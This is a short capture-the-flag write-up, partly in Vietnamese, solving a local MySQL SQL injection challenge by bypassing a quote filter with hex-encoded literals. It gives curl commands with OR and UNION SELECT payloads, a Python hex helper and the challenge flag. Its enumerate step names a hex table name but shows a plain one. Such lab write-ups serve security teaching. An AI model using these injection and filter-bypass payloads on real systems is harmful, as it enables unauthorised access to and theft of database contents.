# SQLi-049: MySQL Quote Filter Bypass - Writeup

## 📋 Tóm Tắt

**Kỹ thuật:** Hex encoding thay thế string literals  
**DBMS:** MySQL  
**Flag:** `FLAG{h3x_3nc0d1ng_qu0t3_byp4ss}`

---

## 🔍 Bước 1: DETECT

```bash
# Test với quote
curl "http://localhost:5049/login?user=admin'&pass=test"
# → "Quote characters are blocked!"
```

## 🎯 Bước 2: BYPASS

MySQL hỗ trợ hex literals thay cho string literals:

```bash
# 'admin' = 0x61646D696E
curl "http://localhost:5049/login?user=admin&pass=x OR username=0x61646D696E-- -"
```

### Hex encoding tool

```python
# Convert string to MySQL hex
def to_hex(s):
    return '0x' + s.encode().hex()

print(to_hex('admin'))  # 0x61646d696e
print(to_hex('flags'))  # 0x666c616773
```

## 🔢 Bước 3: ENUMERATE

```bash
# Using UNION with hex table name
# 0x666c616773 = 'flags'
curl "http://localhost:5049/login?user=x UNION SELECT 1,name,value FROM flags-- -&pass=x"
```

## 🏆 Bước 4: EXFILTRATE

```bash
curl "http://localhost:5049/login?user=x UNION SELECT 1,name,value FROM flags-- -&pass=y"
```

🎉 **FLAG:** `FLAG{h3x_3nc0d1ng_qu0t3_byp4ss}`

## ✅ Flag

```
FLAG{h3x_3nc0d1ng_qu0t3_byp4ss}
```
